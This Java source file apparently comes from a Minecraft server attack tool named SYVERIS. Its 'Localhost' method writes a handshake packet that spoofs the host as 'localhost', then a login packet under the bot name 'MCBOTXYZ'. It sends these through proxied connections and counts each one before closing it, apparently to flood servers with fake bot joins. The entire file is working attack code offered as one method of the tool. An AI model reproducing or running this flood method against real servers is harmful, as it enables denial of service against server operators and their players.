package IO.SYVERIS.methods;

import IO.SYVERIS.Main;
import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;

public class Localhost implements Method {
   public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
      while((paramInt & -128) != 0) {
         out.writeByte(paramInt & 127 | 128);
         paramInt >>>= 7;
      }

      out.writeByte(paramInt);
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream out = new ByteBufOutputStream(b);

      try {
         out.writeByte(13 + Main.protocolLength);
         out.writeByte(0);
         writeVarInt(out, Main.protcolID);
         out.writeByte(9);
         out.writeBytes("localhost");
         out.writeShort(25565);
         out.writeByte(2);
         out.writeByte(10);
         out.writeByte(0);
         out.writeByte(8);
         out.writeBytes("MCBOTXYZ");
         out.close();
      } catch (IOException var6) {
         var6.printStackTrace();
      }

      channel.writeAndFlush(b);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      channel.close();
   }
}
